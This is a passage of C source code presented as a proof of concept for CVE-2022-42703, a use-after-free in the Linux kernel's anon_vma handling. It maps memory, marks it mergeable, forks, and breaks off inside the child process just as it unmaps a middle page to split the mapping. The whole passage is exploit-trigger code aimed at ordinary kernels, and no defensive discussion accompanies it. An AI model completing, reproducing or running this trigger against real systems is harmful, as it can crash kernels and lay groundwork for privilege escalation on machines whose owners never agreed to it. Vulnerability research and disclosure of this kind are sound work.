#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/mman.h>

/*
 * Proof-of-Concept for CVE-2022-42703
 * This program triggers a use-after-free in anon_vma_clone by creating
 * a specific VMA layout through fork() and munmap() and then forking again.
 */
int main(void)
{
    // 1. Map a three-page memory region in the parent process.
    char *addr = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // 2. Mark the region as mergeable to involve KSM, which can affect anon_vma logic.
    if (madvise(addr, 0x3000, MADV_MERGEABLE) < 0) {
        perror("madvise");
    }

    // 3. Fork a child process.
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // --- Child Process ---
        // 4. Create a hole in the middle of the mapping. This splits the VMA for
        // this process into two separate VMAs, creating a more complex anon_vma tree.
        if (munmap(addr + 0x1000, 0x1000) < 0) {
            perror("child munmap");
